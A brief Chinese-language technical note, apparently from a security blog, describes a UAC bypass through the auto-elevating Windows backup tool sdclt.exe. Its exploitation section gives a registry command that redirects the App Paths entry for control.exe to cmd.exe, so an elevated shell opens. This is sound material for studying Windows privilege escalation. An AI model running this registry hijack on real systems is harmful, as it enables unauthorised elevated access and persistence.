### sdclt.exe_bypassuac
---
sdclt.exe一个备份还原程序,使用sigcheck.exe查看该exe信息
sigcheck.exe -m c:\windows\system32\sdclt.exe  
![1](/images/20181111.png)  
该程序启动会自动提升权限,且会以一个高权限去寻找HKCU\Software\Classes\Applications\control.exe键值,最新补丁已经不会执行此路径下的值了,但该程序还会去寻找为HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe,而该键值仍然会执行,但该路径下修改注册表则需要管理员权限  
![1](/images20181112.png)  
![1](/images/20181113.png)  
![1](/images/20181114.png)  
##### 利用  
---
新增一个键值  
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d c:\windows\system32\cmd.exe  
 ![1](/images/20181115.png)  
 ![1](/images/20181116.png)  
 ![1](/images/20181117.png)    
